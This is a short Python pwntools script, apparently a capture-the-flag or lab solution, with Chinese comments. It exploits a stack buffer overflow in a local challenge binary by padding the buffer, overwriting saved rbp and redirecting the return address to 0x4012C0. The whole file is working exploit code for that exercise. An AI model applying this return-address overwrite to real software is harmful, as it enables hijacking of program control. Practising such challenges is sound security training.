#!/usr/bin/python3

import pwn

ret_addr = 0x4012C0

proc = pwn.process("/challenge/buffer-overflow-level1.3")
payload = b'a' * 0x10   # 写满缓冲区
payload += b'b' * 0x8   # 覆盖保存的rbp
payload += pwn.p64(ret_addr) # 覆盖返回地址
print(payload)
proc.sendline(payload)

result = proc.recvall().decode()
for line in result.split('\n'):
    print(line)